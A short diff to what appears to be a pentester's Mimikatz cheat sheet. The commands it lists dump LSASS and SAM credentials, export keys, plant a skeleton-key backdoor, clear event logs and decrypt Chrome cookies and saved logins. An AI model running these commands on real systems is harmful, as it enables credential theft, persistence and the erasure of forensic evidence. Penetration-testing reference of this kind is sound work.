@@ -11,17 +11,22 @@ Mimikatz is a very useful utility for pentesters, so change the commands to ones
 # examples for additions
 Extract from lsass (service)
 - lsadump::lsa /inject
+
 Extract from SAM
 - lsadump::sam
+
 print list of provider keys
 - crypto::keys /export
+
 skeleton key
 - misc::skeleton
+
 event logs
 - event::clear
 - event::clear /log:system
-Chrome Exfiltration
-Cookies
+
+Chrome Cookies
 - dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
-Login Data
+
+Chrome Logins
 - dpapi::chrome /in:"C:\Users\%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" 
